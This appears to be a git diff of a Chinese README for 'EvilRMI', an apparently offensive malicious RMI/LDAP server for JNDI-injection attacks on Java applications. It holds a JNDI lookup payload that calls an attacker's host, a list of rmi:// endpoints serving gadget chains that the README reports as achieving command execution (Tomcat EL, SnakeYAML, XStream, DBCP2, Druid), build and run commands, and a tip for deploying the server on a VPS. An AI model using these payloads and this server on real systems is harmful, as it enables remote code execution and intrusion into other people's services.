@@ -8,10 +8,22 @@ JNDI加载LDAP：`${jndi:ldap://<ip>:1389/Hello}`，利用LDAP反序列化的特
 如果DNS未出网，可以使用延时探测: [构造java探测class反序列化gadget
 ](https://mp.weixin.qq.com/s/KncxkSIZ7HVXZ0iNAX8xPA>)
 
+执行命令测试成功：
+```
+tomcat_el
+tomcat_el_runtime
+tomcat_MVEL
+tomcat_xstream
+tomcat_snakeyaml
+tomcat_tomcat_dbcp2_RCE
+druid
+```
+
 
 ### RmiServer
 
 - `rmi://127.0.0.1:1099/tomcat_el`
+- `rmi://127.0.0.1:1099/tomcat_el_runtime`
     - javax_el_ELProcessor
 - `rmi://127.0.0.1:1099/tomcat_groovy`
 - `rmi://127.0.0.1:1099/tomcat_snakeyaml`
@@ -35,12 +47,12 @@ JNDI加载LDAP：`${jndi:ldap://<ip>:1389/Hello}`，利用LDAP反序列化的特
 - `rmi://127.0.0.1:1099/druid`
     - com.alibaba.druid.pool.DruidDataSourceFactory
 
-#### 编译运行
+#### 编译运行(注意放到VPS的时候修改`java.rmi.server.hostname`)
 1. File -> Project Structure -> Artifats -> + -> Add Jar -> Main Class -> com.rmi.RmiServer
 2. Build -> Build Artifats
 3. java -cp EvilRMI.jar com.rmi.RmiServer
 
-
+#### 参考链接
 * [老链新用，利用URLDNS链探测gadget](https://mp.weixin.qq.com/s/p_mBiEhXuHa11usHPzHlEA)
 * [Urldns链探测类工具发放](https://mp.weixin.qq.com/s/DN9n_xAd0QRB2G1kjbeGMw)
 * [构造java探测class反序列化gadget](https://mp.weixin.qq.com/s/KncxkSIZ7HVXZ0iNAX8xPA)
